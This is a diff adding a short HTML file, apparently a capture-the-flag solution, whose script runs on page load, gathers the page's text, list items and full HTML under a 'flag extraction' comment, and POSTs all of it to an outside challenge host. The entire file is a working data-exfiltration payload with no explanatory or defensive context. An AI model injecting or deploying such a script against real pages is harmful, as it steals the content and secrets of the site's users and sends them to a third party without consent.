@@ -1,0 +1,29 @@
+        <!DOCTYPE html>
+        <html>
+        <body>
+        <script>
+            // Comprehensive flag extraction mechanism
+            document.addEventListener('DOMContentLoaded', () => {
+                const extractionMethods = [
+                    () => document.body.innerText,
+                    () => Array.from(document.querySelectorAll('li')).map(el => el.innerText).join('\n'),
+                    () => document.documentElement.innerHTML
+                ];
+
+                const extractedContent = extractionMethods.map(method => {
+                    try {
+                        return method();
+                    } catch (error) {
+                        return `Extraction Error: ${error.message}`;
+                    }
+                }).join('\n---SEPARATOR---\n');
+
+                // Send to external endpoint
+                fetch('https://ch717014362.challenges.eng.run', {
+                    method: 'POST',
+                    body: extractedContent
+                });
+            });
+        </script>
+        </body>
+        </html>
